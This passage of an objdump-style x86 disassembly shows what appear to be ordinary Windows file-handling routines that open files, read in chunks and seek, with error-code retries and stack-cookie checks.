  401db3:	83 f8 20             	cmp    $0x20,%eax
  401db6:	75 0e                	jne    0x401dc6
  401db8:	f6 c3 20             	test   $0x20,%bl
  401dbb:	75 09                	jne    0x401dc6
  401dbd:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  401dc1:	83 c8 ff             	or     $0xffffffff,%eax
  401dc4:	eb 14                	jmp    0x401dda
  401dc6:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  401dca:	33 c0                	xor    %eax,%eax
  401dcc:	50                   	push   %eax
  401dcd:	50                   	push   %eax
  401dce:	6a 02                	push   $0x2
  401dd0:	50                   	push   %eax
  401dd1:	53                   	push   %ebx
  401dd2:	57                   	push   %edi
  401dd3:	55                   	push   %ebp
  401dd4:	ff 15 30 a0 42 00    	call   *0x42a030
  401dda:	89 46 08             	mov    %eax,0x8(%esi)
  401ddd:	83 f8 ff             	cmp    $0xffffffff,%eax
  401de0:	75 2b                	jne    0x401e0d
  401de2:	68 00 08 00 00       	push   $0x800
  401de7:	8d 44 24 18          	lea    0x18(%esp),%eax
  401deb:	50                   	push   %eax
  401dec:	55                   	push   %ebp
  401ded:	e8 ab 1e 00 00       	call   0x403c9d
  401df2:	84 c0                	test   %al,%al
  401df4:	74 17                	je     0x401e0d
  401df6:	33 c0                	xor    %eax,%eax
  401df8:	50                   	push   %eax
  401df9:	50                   	push   %eax
  401dfa:	6a 02                	push   $0x2
  401dfc:	50                   	push   %eax
  401dfd:	53                   	push   %ebx
  401dfe:	57                   	push   %edi
  401dff:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  401e03:	50                   	push   %eax
  401e04:	ff 15 30 a0 42 00    	call   *0x42a030
  401e0a:	89 46 08             	mov    %eax,0x8(%esi)
  401e0d:	83 66 10 00          	andl   $0x0,0x10(%esi)
  401e11:	8d 46 32             	lea    0x32(%esi),%eax
  401e14:	68 00 08 00 00       	push   $0x800
  401e19:	55                   	push   %ebp
  401e1a:	50                   	push   %eax
  401e1b:	c6 46 1c 01          	movb   $0x1,0x1c(%esi)
  401e1f:	c6 46 15 00          	movb   $0x0,0x15(%esi)
  401e23:	e8 4f 52 00 00       	call   0x407077
  401e28:	83 7e 08 ff          	cmpl   $0xffffffff,0x8(%esi)
  401e2c:	8b 8c 24 14 10 00 00 	mov    0x1014(%esp),%ecx
  401e33:	5f                   	pop    %edi
  401e34:	5e                   	pop    %esi
  401e35:	5d                   	pop    %ebp
  401e36:	0f 95 c0             	setne  %al
  401e39:	5b                   	pop    %ebx
  401e3a:	33 cc                	xor    %esp,%ecx
  401e3c:	e8 18 47 01 00       	call   0x416559
  401e41:	81 c4 08 10 00 00    	add    $0x1008,%esp
  401e47:	c2 08 00             	ret    $0x8
  401e4a:	57                   	push   %edi
  401e4b:	8b f9                	mov    %ecx,%edi
  401e4d:	83 7f 10 00          	cmpl   $0x0,0x10(%edi)
  401e51:	75 2a                	jne    0x401e7d
  401e53:	83 7f 08 ff          	cmpl   $0xffffffff,0x8(%edi)
  401e57:	74 13                	je     0x401e6c
  401e59:	8b 07                	mov    (%edi),%eax
  401e5b:	56                   	push   %esi
  401e5c:	8b 70 08             	mov    0x8(%eax),%esi
  401e5f:	8b ce                	mov    %esi,%ecx
  401e61:	ff 15 30 a2 42 00    	call   *0x42a230
  401e67:	8b cf                	mov    %edi,%ecx
  401e69:	ff d6                	call   *%esi
  401e6b:	5e                   	pop    %esi
  401e6c:	80 7f 1d 00          	cmpb   $0x0,0x1d(%edi)
  401e70:	74 0b                	je     0x401e7d
  401e72:	8d 47 32             	lea    0x32(%edi),%eax
  401e75:	50                   	push   %eax
  401e76:	e8 23 0c 00 00       	call   0x402a9e
  401e7b:	5f                   	pop    %edi
  401e7c:	c3                   	ret
  401e7d:	32 c0                	xor    %al,%al
  401e7f:	5f                   	pop    %edi
  401e80:	c3                   	ret
  401e81:	55                   	push   %ebp
  401e82:	8b ec                	mov    %esp,%ebp
  401e84:	51                   	push   %ecx
  401e85:	56                   	push   %esi
  401e86:	8b f1                	mov    %ecx,%esi
  401e88:	57                   	push   %edi
  401e89:	83 7e 10 01          	cmpl   $0x1,0x10(%esi)
  401e8d:	75 0b                	jne    0x401e9a
  401e8f:	6a f6                	push   $0xfffffff6
  401e91:	ff 15 10 a0 42 00    	call   *0x42a010
  401e97:	89 46 08             	mov    %eax,0x8(%esi)
  401e9a:	6a 00                	push   $0x0
  401e9c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401e9f:	50                   	push   %eax
  401ea0:	ff 75 0c             	push   0xc(%ebp)
  401ea3:	ff 75 08             	push   0x8(%ebp)
  401ea6:	ff 76 08             	push   0x8(%esi)
  401ea9:	ff 15 18 a0 42 00    	call   *0x42a018
  401eaf:	85 c0                	test   %eax,%eax
  401eb1:	75 5a                	jne    0x401f0d
  401eb3:	8b ce                	mov    %esi,%ecx
  401eb5:	e8 d4 00 00 00       	call   0x401f8e
  401eba:	84 c0                	test   %al,%al
  401ebc:	74 17                	je     0x401ed5
  401ebe:	b8 20 4e 00 00       	mov    $0x4e20,%eax
  401ec3:	39 45 0c             	cmp    %eax,0xc(%ebp)
  401ec6:	76 0d                	jbe    0x401ed5
  401ec8:	50                   	push   %eax
  401ec9:	ff 75 08             	push   0x8(%ebp)
  401ecc:	8b ce                	mov    %esi,%ecx
  401ece:	e8 ae ff ff ff       	call   0x401e81
  401ed3:	eb 3b                	jmp    0x401f10
  401ed5:	83 7e 10 01          	cmpl   $0x1,0x10(%esi)
  401ed9:	75 0f                	jne    0x401eea
  401edb:	ff 15 00 a0 42 00    	call   *0x42a000
  401ee1:	83 f8 6d             	cmp    $0x6d,%eax
  401ee4:	75 04                	jne    0x401eea
  401ee6:	33 c0                	xor    %eax,%eax
  401ee8:	eb 26                	jmp    0x401f10
  401eea:	83 7e 10 00          	cmpl   $0x0,0x10(%esi)
  401eee:	75 18                	jne    0x401f08
  401ef0:	bf 00 80 00 00       	mov    $0x8000,%edi
  401ef5:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  401ef8:	76 0e                	jbe    0x401f08
  401efa:	ff 15 00 a0 42 00    	call   *0x42a000
  401f00:	83 f8 21             	cmp    $0x21,%eax
  401f03:	75 03                	jne    0x401f08
  401f05:	57                   	push   %edi
  401f06:	eb c1                	jmp    0x401ec9
  401f08:	83 c8 ff             	or     $0xffffffff,%eax
  401f0b:	eb 03                	jmp    0x401f10
  401f0d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401f10:	5f                   	pop    %edi
  401f11:	5e                   	pop    %esi
  401f12:	c9                   	leave
  401f13:	c2 08 00             	ret    $0x8
  401f16:	51                   	push   %ecx
  401f17:	51                   	push   %ecx
  401f18:	53                   	push   %ebx
  401f19:	8b d9                	mov    %ecx,%ebx
  401f1b:	55                   	push   %ebp
  401f1c:	56                   	push   %esi
  401f1d:	57                   	push   %edi
  401f1e:	8b 03                	mov    (%ebx),%eax
  401f20:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  401f24:	8b 70 14             	mov    0x14(%eax),%esi
  401f27:	8b ce                	mov    %esi,%ecx
  401f29:	ff 15 30 a2 42 00    	call   *0x42a230
  401f2f:	8b cb                	mov    %ebx,%ecx
  401f31:	ff d6                	call   *%esi
  401f33:	8b 0b                	mov    (%ebx),%ecx
  401f35:	8b ea                	mov    %edx,%ebp
  401f37:	6a 02                	push   $0x2
  401f39:	6a 00                	push   $0x0
  401f3b:	6a 00                	push   $0x0
  401f3d:	8b 71 10             	mov    0x10(%ecx),%esi
  401f40:	8b ce                	mov    %esi,%ecx
  401f42:	89 44 24 20          	mov    %eax,0x20(%esp)
  401f46:	ff 15 30 a2 42 00    	call   *0x42a230
  401f4c:	8b cb                	mov    %ebx,%ecx
  401f4e:	ff d6                	call   *%esi
  401f50:	8b 03                	mov    (%ebx),%eax
  401f52:	8b 70 14             	mov    0x14(%eax),%esi
  401f55:	8b ce                	mov    %esi,%ecx
  401f57:	ff 15 30 a2 42 00    	call   *0x42a230
  401f5d:	8b cb                	mov    %ebx,%ecx
  401f5f:	ff d6                	call   *%esi
  401f61:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401f65:	8b f8                	mov    %eax,%edi
  401f67:	6a 00                	push   $0x0
  401f69:	55                   	push   %ebp
  401f6a:	ff 74 24 1c          	push   0x1c(%esp)
  401f6e:	8b 09                	mov    (%ecx),%ecx
  401f70:	8b da                	mov    %edx,%ebx
  401f72:	8b 71 10             	mov    0x10(%ecx),%esi
  401f75:	8b ce                	mov    %esi,%ecx
  401f77:	ff 15 30 a2 42 00    	call   *0x42a230
  401f7d:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401f81:	ff d6                	call   *%esi
  401f83:	8b c7                	mov    %edi,%eax
  401f85:	8b d3                	mov    %ebx,%edx
  401f87:	5f                   	pop    %edi
  401f88:	5e                   	pop    %esi
  401f89:	5d                   	pop    %ebp
  401f8a:	5b                   	pop    %ebx
  401f8b:	59                   	pop    %ecx
  401f8c:	59                   	pop    %ecx
  401f8d:	c3                   	ret
  401f8e:	83 79 08 ff          	cmpl   $0xffffffff,0x8(%ecx)
  401f92:	75 03                	jne    0x401f97
  401f94:	32 c0                	xor    %al,%al
  401f96:	c3                   	ret
  401f97:	ff 71 08             	push   0x8(%ecx)
  401f9a:	ff 15 0c a0 42 00    	call   *0x42a00c
  401fa0:	83 f8 02             	cmp    $0x2,%eax
  401fa3:	74 05                	je     0x401faa
  401fa5:	83 f8 03             	cmp    $0x3,%eax
  401fa8:	75 ea                	jne    0x401f94
  401faa:	b0 01                	mov    $0x1,%al
  401fac:	c3                   	ret
  401fad:	cc                   	int3
  401fae:	cc                   	int3
  401faf:	cc                   	int3
  401fb0:	83 79 08 ff          	cmpl   $0xffffffff,0x8(%ecx)
  401fb4:	0f 95 c0             	setne  %al
  401fb7:	c3                   	ret
  401fb8:	cc                   	int3
  401fb9:	cc                   	int3
  401fba:	cc                   	int3
  401fbb:	cc                   	int3
  401fbc:	cc                   	int3
  401fbd:	cc                   	int3
  401fbe:	cc                   	int3
  401fbf:	cc                   	int3
  401fc0:	b8 58 10 00 00       	mov    $0x1058,%eax
  401fc5:	e8 36 46 01 00       	call   0x416600
  401fca:	a1 5c 56 43 00       	mov    0x43565c,%eax
  401fcf:	33 c4                	xor    %esp,%eax
  401fd1:	89 84 24 54 10 00 00 	mov    %eax,0x1054(%esp)
  401fd8:	53                   	push   %ebx
  401fd9:	8b 9c 24 64 10 00 00 	mov    0x1064(%esp),%ebx
  401fe0:	55                   	push   %ebp
  401fe1:	8b ac 24 64 10 00 00 	mov    0x1064(%esp),%ebp
  401fe8:	57                   	push   %edi
  401fe9:	8b f9                	mov    %ecx,%edi
  401feb:	89 6c 24 0c          	mov    %ebp,0xc(%esp)
  401fef:	83 a7 34 10 00 00 00 	andl   $0x0,0x1034(%edi)
  401ff6:	80 7f 30 00          	cmpb   $0x0,0x30(%edi)
  401ffa:	75 09                	jne    0x402005
  401ffc:	f6 c3 04             	test   $0x4,%bl
  401fff:	75 04                	jne    0x402005
  402001:	32 c0                	xor    %al,%al
  402003:	eb 02                	jmp    0x402007
  402005:	b0 01                	mov    $0x1,%al
  402007:	56                   	push   %esi
  402008:	8b f3                	mov    %ebx,%esi
  40200a:	d1 ee                	shr    $1,%esi
  40200c:	f7 d6                	not    %esi
  40200e:	83 e6 01             	and    $0x1,%esi
  402011:	46                   	inc    %esi
  402012:	c1 e6 1e             	shl    $0x1e,%esi
  402015:	f6 c3 01             	test   $0x1,%bl
  402018:	74 06                	je     0x402020
  40201a:	81 ce 00 00 00 40    	or     $0x40000000,%esi
  402020:	c1 eb 03             	shr    $0x3,%ebx
  402023:	f7 d3                	not    %ebx
  402025:	83 e3 01             	and    $0x1,%ebx
  402028:	84 c0                	test   %al,%al
  40202a:	74 03                	je     0x40202f
  40202c:	83 cb 02             	or     $0x2,%ebx
  40202f:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  402033:	e8 12 fc ff ff       	call   0x401c4a
  402038:	80 7f 24 00          	cmpb   $0x0,0x24(%edi)
  40203c:	74 06                	je     0x402044
  40203e:	81 ce 00 01 00 00    	or     $0x100,%esi
  402044:	6a 00                	push   $0x0
  402046:	68 00 00 00 08       	push   $0x8000000
  40204b:	6a 03                	push   $0x3
  40204d:	6a 00                	push   $0x0
  40204f:	53                   	push   %ebx
  402050:	56                   	push   %esi
  402051:	55                   	push   %ebp
  402052:	ff 15 30 a0 42 00    	call   *0x42a030
  402058:	8b e8                	mov    %eax,%ebp
  40205a:	83 fd ff             	cmp    $0xffffffff,%ebp
  40205d:	75 4c                	jne    0x4020ab
  40205f:	ff 15 00 a0 42 00    	call   *0x42a000
  402065:	89 44 24 14          	mov    %eax,0x14(%esp)
  402069:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40206d:	68 00 08 00 00       	push   $0x800
  402072:	50                   	push   %eax
  402073:	ff 74 24 18          	push   0x18(%esp)
  402077:	e8 21 1c 00 00       	call   0x403c9d
  40207c:	84 c0                	test   %al,%al
  40207e:	74 38                	je     0x4020b8
  402080:	6a 00                	push   $0x0
  402082:	68 00 00 00 08       	push   $0x8000000
  402087:	6a 03                	push   $0x3
  402089:	6a 00                	push   $0x0
  40208b:	53                   	push   %ebx
  40208c:	56                   	push   %esi
  40208d:	8d 44 24 34          	lea    0x34(%esp),%eax
  402091:	50                   	push   %eax
  402092:	ff 15 30 a0 42 00    	call   *0x42a030
  402098:	8b e8                	mov    %eax,%ebp
  40209a:	ff 15 00 a0 42 00    	call   *0x42a000
  4020a0:	83 f8 02             	cmp    $0x2,%eax
  4020a3:	75 0e                	jne    0x4020b3
  4020a5:	89 44 24 14          	mov    %eax,0x14(%esp)
  4020a9:	eb 08                	jmp    0x4020b3
  4020ab:	8b 44 24 10          	mov    0x10(%esp),%eax
  4020af:	89 44 24 14          	mov    %eax,0x14(%esp)
  4020b3:	83 fd ff             	cmp    $0xffffffff,%ebp
  4020b6:	75 11                	jne    0x4020c9
  4020b8:	83 7c 24 14 02       	cmpl   $0x2,0x14(%esp)
  4020bd:	75 0a                	jne    0x4020c9
  4020bf:	c7 87 34 10 00 00 01 	movl   $0x1,0x1034(%edi)
  4020c6:	00 00 00 
  4020c9:	80 7f 24 00          	cmpb   $0x0,0x24(%edi)
  4020cd:	5e                   	pop    %esi
  4020ce:	74 1f                	je     0x4020ef
  4020d0:	83 fd ff             	cmp    $0xffffffff,%ebp
  4020d3:	74 1a                	je     0x4020ef
  4020d5:	83 4c 24 10 ff       	orl    $0xffffffff,0x10(%esp)
  4020da:	8d 44 24 10          	lea    0x10(%esp),%eax
  4020de:	83 4c 24 14 ff       	orl    $0xffffffff,0x14(%esp)
  4020e3:	6a 00                	push   $0x0
  4020e5:	50                   	push   %eax
  4020e6:	6a 00                	push   $0x0
  4020e8:	55                   	push   %ebp
  4020e9:	ff 15 28 a0 42 00    	call   *0x42a028
  4020ef:	33 c0                	xor    %eax,%eax
  4020f1:	83 fd ff             	cmp    $0xffffffff,%ebp
  4020f4:	88 47 1c             	mov    %al,0x1c(%edi)
  4020f7:	89 47 10             	mov    %eax,0x10(%edi)
  4020fa:	0f 95 c3             	setne  %bl
  4020fd:	88 47 15             	mov    %al,0x15(%edi)
  402100:	74 19                	je     0x40211b
  402102:	68 00 08 00 00       	push   $0x800
  402107:	ff 74 24 10          	push   0x10(%esp)
  40210b:	8d 4f 32             	lea    0x32(%edi),%ecx
  40210e:	89 6f 08             	mov    %ebp,0x8(%edi)
  402111:	51                   	push   %ecx
  402112:	e8 60 4f 00 00       	call   0x407077
  402117:	c6 47 25 00          	movb   $0x0,0x25(%edi)
  40211b:	8b 8c 24 60 10 00 00 	mov    0x1060(%esp),%ecx
  402122:	8a c3                	mov    %bl,%al
  402124:	5f                   	pop    %edi
  402125:	5d                   	pop    %ebp
  402126:	5b                   	pop    %ebx
  402127:	33 cc                	xor    %esp,%ecx
  402129:	e8 2b 44 01 00       	call   0x416559
  40212e:	81 c4 58 10 00 00    	add    $0x1058,%esp
  402134:	c2 08 00             	ret    $0x8
  402137:	b8 10 10 00 00       	mov    $0x1010,%eax
  40213c:	e8 bf 44 01 00       	call   0x416600
  402141:	a1 5c 56 43 00       	mov    0x43565c,%eax
  402146:	33 c4                	xor    %esp,%eax
  402148:	89 84 24 0c 10 00 00 	mov    %eax,0x100c(%esp)
  40214f:	53                   	push   %ebx
  402150:	55                   	push   %ebp
  402151:	56                   	push   %esi
  402152:	57                   	push   %edi
  402153:	8b f9                	mov    %ecx,%edi
  402155:	83 7f 08 ff          	cmpl   $0xffffffff,0x8(%edi)
  402159:	74 74                	je     0x4021cf
  40215b:	83 7f 10 01          	cmpl   $0x1,0x10(%edi)
  40215f:	0f 85 01 01 00 00    	jne    0x402266
  402165:	8b 84 24 2c 10 00 00 	mov    0x102c(%esp),%eax
  40216c:	83 f8 01             	cmp    $0x1,%eax
  40216f:	74 7b                	je     0x4021ec
  402171:	85 c0                	test   %eax,%eax
  402173:	75 26                	jne    0x40219b
  402175:	8b ac 24 28 10 00 00 	mov    0x1028(%esp),%ebp
  40217c:	8b 9c 24 24 10 00 00 	mov    0x1024(%esp),%ebx
  402183:	3b 6f 2c             	cmp    0x2c(%edi),%ebp
  402186:	7f 0b                	jg     0x402193
  402188:	7c 05                	jl     0x40218f
  40218a:	3b 5f 28             	cmp    0x28(%edi),%ebx
  40218d:	73 04                	jae    0x402193
  40218f:	8b df                	mov    %edi,%ebx
  402191:	eb 0a                	jmp    0x40219d
  402193:	2b 5f 28             	sub    0x28(%edi),%ebx
  402196:	1b 6f 2c             	sbb    0x2c(%edi),%ebp
  402199:	eb 5f                	jmp    0x4021fa
  40219b:	8b d9                	mov    %ecx,%ebx
  40219d:	83 f8 02             	cmp    $0x2,%eax
  4021a0:	0f 85 b9 00 00 00    	jne    0x40225f
  4021a6:	bd 00 10 00 00       	mov    $0x1000,%ebp
  4021ab:	eb 07                	jmp    0x4021b4
  4021ad:	01 43 28             	add    %eax,0x28(%ebx)
  4021b0:	83 53 2c 00          	adcl   $0x0,0x2c(%ebx)
  4021b4:	8b 07                	mov    (%edi),%eax
  4021b6:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4021ba:	55                   	push   %ebp
  4021bb:	51                   	push   %ecx
  4021bc:	8b 70 0c             	mov    0xc(%eax),%esi
  4021bf:	8b ce                	mov    %esi,%ecx
  4021c1:	ff 15 30 a2 42 00    	call   *0x42a230
  4021c7:	8b cf                	mov    %edi,%ecx
  4021c9:	ff d6                	call   *%esi
  4021cb:	85 c0                	test   %eax,%eax
  4021cd:	7f de                	jg     0x4021ad
  4021cf:	b0 01                	mov    $0x1,%al
  4021d1:	8b 8c 24 1c 10 00 00 	mov    0x101c(%esp),%ecx
  4021d8:	5f                   	pop    %edi
  4021d9:	5e                   	pop    %esi
  4021da:	5d                   	pop    %ebp
  4021db:	5b                   	pop    %ebx
  4021dc:	33 cc                	xor    %esp,%ecx
  4021de:	e8 76 43 01 00       	call   0x416559
  4021e3:	81 c4 10 10 00 00    	add    $0x1010,%esp
  4021e9:	c2 0c 00             	ret    $0xc
  4021ec:	8b 9c 24 24 10 00 00 	mov    0x1024(%esp),%ebx
  4021f3:	8b ac 24 28 10 00 00 	mov    0x1028(%esp),%ebp
  4021fa:	85 ed                	test   %ebp,%ebp
  4021fc:	75 04                	jne    0x402202
  4021fe:	eb 56                	jmp    0x402256
  402200:	85 ed                	test   %ebp,%ebp
  402202:	77 12                	ja     0x402216
  402204:	72 08                	jb     0x40220e
  402206:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  40220c:	73 08                	jae    0x402216
  40220e:	8b cb                	mov    %ebx,%ecx
  402210:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  402214:	eb 0a                	jmp    0x402220
  402216:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  40221b:	b9 00 10 00 00       	mov    $0x1000,%ecx
  402220:	8b 07                	mov    (%edi),%eax
  402222:	51                   	push   %ecx
  402223:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  402227:	51                   	push   %ecx
  402228:	8b 70 0c             	mov    0xc(%eax),%esi
  40222b:	8b ce                	mov    %esi,%ecx
  40222d:	ff 15 30 a2 42 00    	call   *0x42a230
  402233:	8b cf                	mov    %edi,%ecx
  402235:	ff d6                	call   *%esi
  402237:	85 c0                	test   %eax,%eax
  402239:	7e 24                	jle    0x40225f
  40223b:	99                   	cltd
  40223c:	8b cf                	mov    %edi,%ecx
  40223e:	6a 28                	push   $0x28
  402240:	2b d8                	sub    %eax,%ebx
  402242:	5e                   	pop    %esi
  402243:	1b ea                	sbb    %edx,%ebp
  402245:	01 04 31             	add    %eax,(%ecx,%esi,1)
  402248:	11 54 31 04          	adc    %edx,0x4(%ecx,%esi,1)
  40224c:	85 ed                	test   %ebp,%ebp
  40224e:	77 c6                	ja     0x402216
  402250:	0f 82 79 ff ff ff    	jb     0x4021cf
  402256:	85 db                	test   %ebx,%ebx
  402258:	75 a6                	jne    0x402200
  40225a:	e9 70 ff ff ff       	jmp    0x4021cf
  40225f:	32 c0                	xor    %al,%al
  402261:	e9 6b ff ff ff       	jmp    0x4021d1
  402266:	8b ac 24 28 10 00 00 	mov    0x1028(%esp),%ebp
  40226d:	8b 9c 24 24 10 00 00 	mov    0x1024(%esp),%ebx
  402274:	85 ed                	test   %ebp,%ebp
  402276:	7f 36                	jg     0x4022ae
  402278:	7c 04                	jl     0x40227e
  40227a:	85 db                	test   %ebx,%ebx
  40227c:	73 30                	jae    0x4022ae
  40227e:	8b 84 24 2c 10 00 00 	mov    0x102c(%esp),%eax
  402285:	85 c0                	test   %eax,%eax
  402287:	74 2c                	je     0x4022b5
  402289:	83 f8 01             	cmp    $0x1,%eax
  40228c:	75 13                	jne    0x4022a1
  40228e:	8b 07                	mov    (%edi),%eax
  402290:	8b 70 14             	mov    0x14(%eax),%esi
  402293:	8b ce                	mov    %esi,%ecx
  402295:	ff 15 30 a2 42 00    	call   *0x42a230
  40229b:	8b cf                	mov    %edi,%ecx
  40229d:	ff d6                	call   *%esi
  40229f:	eb 05                	jmp    0x4022a6
  4022a1:	e8 70 fc ff ff       	call   0x401f16
  4022a6:	03 d8                	add    %eax,%ebx
  4022a8:	13 ea                	adc    %edx,%ebp
  4022aa:	33 c0                	xor    %eax,%eax
  4022ac:	eb 07                	jmp    0x4022b5
  4022ae:	8b 84 24 2c 10 00 00 	mov    0x102c(%esp),%eax
  4022b5:	50                   	push   %eax
  4022b6:	8d 44 24 14          	lea    0x14(%esp),%eax
  4022ba:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  4022be:	50                   	push   %eax
  4022bf:	53                   	push   %ebx
  4022c0:	ff 77 08             	push   0x8(%edi)
  4022c3:	ff 15 24 a0 42 00    	call   *0x42a024
  4022c9:	83 f8 ff             	cmp    $0xffffffff,%eax
  4022cc:	0f 85 fd fe ff ff    	jne    0x4021cf
  4022d2:	ff 15 00 a0 42 00    	call   *0x42a000
  4022d8:	f7 d8                	neg    %eax
  4022da:	1a c0                	sbb    %al,%al
  4022dc:	fe c0                	inc    %al
  4022de:	e9 ee fe ff ff       	jmp    0x4021d1
  4022e3:	cc                   	int3
  4022e4:	cc                   	int3
  4022e5:	cc                   	int3
  4022e6:	cc                   	int3
  4022e7:	cc                   	int3
  4022e8:	cc                   	int3
  4022e9:	cc                   	int3
  4022ea:	cc                   	int3
  4022eb:	cc                   	int3
  4022ec:	cc                   	int3
  4022ed:	cc                   	int3
  4022ee:	cc                   	int3
  4022ef:	cc                   	int3
  4022f0:	83 ec 10             	sub    $0x10,%esp
  4022f3:	57                   	push   %edi
  4022f4:	8b f9                	mov    %ecx,%edi
  4022f6:	80 7f 25 00          	cmpb   $0x0,0x25(%edi)
  4022fa:	74 07                	je     0x402303
  4022fc:	33 c0                	xor    %eax,%eax
  4022fe:	e9 7d 01 00 00       	jmp    0x402480
  402303:	83 64 24 0c 00       	andl   $0x0,0xc(%esp)
  402308:	83 64 24 10 00       	andl   $0x0,0x10(%esp)
  40230d:	83 7f 18 02          	cmpl   $0x2,0x18(%edi)
  402311:	56                   	push   %esi
  402312:	75 19                	jne    0x40232d
  402314:	8b 07                	mov    (%edi),%eax
  402316:	8b 70 14             	mov    0x14(%eax),%esi
  402319:	8b ce                	mov    %esi,%ecx
  40231b:	ff 15 30 a2 42 00    	call   *0x42a230
  402321:	8b cf                	mov    %edi,%ecx
  402323:	ff d6                	call   *%esi
  402325:	89 44 24 10          	mov    %eax,0x10(%esp)
  402329:	89 54 24 14          	mov    %edx,0x14(%esp)
  40232d:	8b 74 24 20          	mov    0x20(%esp),%esi
  402331:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402335:	55                   	push   %ebp
  402336:	33 ed                	xor    %ebp,%ebp
  402338:	53                   	push   %ebx
  402339:	56                   	push   %esi
  40233a:	50                   	push   %eax
  40233b:	8b cf                	mov    %edi,%ecx
  40233d:	e8 3f fb ff ff       	call   0x401e81
  402342:	8b d8                	mov    %eax,%ebx
  402344:	83 fb ff             	cmp    $0xffffffff,%ebx
  402347:	0f 85 ee 00 00 00    	jne    0x40243b
  40234d:	80 7f 1e 00          	cmpb   $0x0,0x1e(%edi)
  402351:	6a 02                	push   $0x2
  402353:	58                   	pop    %eax
  402354:	89 87 34 10 00 00    	mov    %eax,0x1034(%edi)
  40235a:	0f 84 db 00 00 00    	je     0x40243b
  402360:	39 47 18             	cmp    %eax,0x18(%edi)
  402363:	75 77                	jne    0x4023dc
  402365:	33 c0                	xor    %eax,%eax
  402367:	33 db                	xor    %ebx,%ebx
  402369:	89 44 24 14          	mov    %eax,0x14(%esp)
  40236d:	85 f6                	test   %esi,%esi
  40236f:	0f 84 c6 00 00 00    	je     0x40243b
  402375:	8b 37                	mov    (%edi),%esi
  402377:	8b c8                	mov    %eax,%ecx
  402379:	33 c0                	xor    %eax,%eax
  40237b:	03 4c 24 18          	add    0x18(%esp),%ecx
  40237f:	6a 00                	push   $0x0
  402381:	13 44 24 20          	adc    0x20(%esp),%eax
  402385:	50                   	push   %eax
  402386:	51                   	push   %ecx
  402387:	8b 4e 10             	mov    0x10(%esi),%ecx
  40238a:	ff 15 30 a2 42 00    	call   *0x42a230
  402390:	8b cf                	mov    %edi,%ecx
  402392:	ff 56 10             	call   *0x10(%esi)
  402395:	8b 74 24 28          	mov    0x28(%esp),%esi
  402399:	b9 00 02 00 00       	mov    $0x200,%ecx
  40239e:	8b c6                	mov    %esi,%eax
  4023a0:	2b 44 24 14          	sub    0x14(%esp),%eax
  4023a4:	3b c1                	cmp    %ecx,%eax
  4023a6:	72 02                	jb     0x4023aa
  4023a8:	8b c1                	mov    %ecx,%eax
  4023aa:	50                   	push   %eax
  4023ab:	ff 74 24 28          	push   0x28(%esp)
  4023af:	8b cf                	mov    %edi,%ecx
  4023b1:	e8 cb fa ff ff       	call   0x401e81
  4023b6:	83 f8 ff             	cmp    $0xffffffff,%eax
  4023b9:	75 05                	jne    0x4023c0
  4023bb:	b8 00 02 00 00       	mov    $0x200,%eax
  4023c0:	03 d8                	add    %eax,%ebx
  4023c2:	83 fb ff             	cmp    $0xffffffff,%ebx
  4023c5:	74 02                	je     0x4023c9
  4023c7:	03 eb                	add    %ebx,%ebp
  4023c9:	8b 44 24 14          	mov    0x14(%esp),%eax
  4023cd:	05 00 02 00 00       	add    $0x200,%eax
  4023d2:	89 44 24 14          	mov    %eax,0x14(%esp)
  4023d6:	3b c6                	cmp    %esi,%eax
  4023d8:	72 9b                	jb     0x402375
  4023da:	eb 5f                	jmp    0x40243b
  4023dc:	33 c0                	xor    %eax,%eax
  4023de:	88 44 24 12          	mov    %al,0x12(%esp)
  4023e2:	88 44 24 11          	mov    %al,0x11(%esp)
  4023e6:	88 44 24 13          	mov    %al,0x13(%esp)
  4023ea:	39 47 18             	cmp    %eax,0x18(%edi)
  4023ed:	75 38                	jne    0x402427
  4023ef:	39 47 10             	cmp    %eax,0x10(%edi)
  4023f2:	75 33                	jne    0x402427
  4023f4:	8d 44 24 13          	lea    0x13(%esp),%eax
  4023f8:	b9 ac bd 45 00       	mov    $0x45bdac,%ecx
  4023fd:	50                   	push   %eax
  4023fe:	8d 44 24 15          	lea    0x15(%esp),%eax
  402402:	50                   	push   %eax
  402403:	8d 44 24 1a          	lea    0x1a(%esp),%eax
  402407:	50                   	push   %eax
  402408:	8d 47 32             	lea    0x32(%edi),%eax
  40240b:	50                   	push   %eax
  40240c:	e8 45 f4 ff ff       	call   0x401856
  402411:	80 7c 24 11 00       	cmpb   $0x0,0x11(%esp)
  402416:	8b 44 24 24          	mov    0x24(%esp),%eax
  40241a:	0f 85 19 ff ff ff    	jne    0x402339
  402420:	80 7c 24 12 00       	cmpb   $0x0,0x12(%esp)
  402425:	75 3f                	jne    0x402466
  402427:	83 7f 18 01          	cmpl   $0x1,0x18(%edi)
  40242b:	74 39                	je     0x402466
  40242d:	8d 47 32             	lea    0x32(%edi),%eax
  402430:	b9 ac bd 45 00       	mov    $0x45bdac,%ecx
  402435:	50                   	push   %eax
  402436:	e8 95 f5 ff ff       	call   0x4019d0
  40243b:	03 eb                	add    %ebx,%ebp
  40243d:	83 7f 10 01          	cmpl   $0x1,0x10(%edi)
  402441:	75 2b                	jne    0x40246e
  402443:	80 7f 14 00          	cmpb   $0x0,0x14(%edi)
  402447:	75 25                	jne    0x40246e
  402449:	85 db                	test   %ebx,%ebx
  40244b:	7e 21                	jle    0x40246e
  40244d:	3b de                	cmp    %esi,%ebx
  40244f:	73 1d                	jae    0x40246e
  402451:	8b 44 24 24          	mov    0x24(%esp),%eax
  402455:	03 c3                	add    %ebx,%eax
  402457:	2b f3                	sub    %ebx,%esi
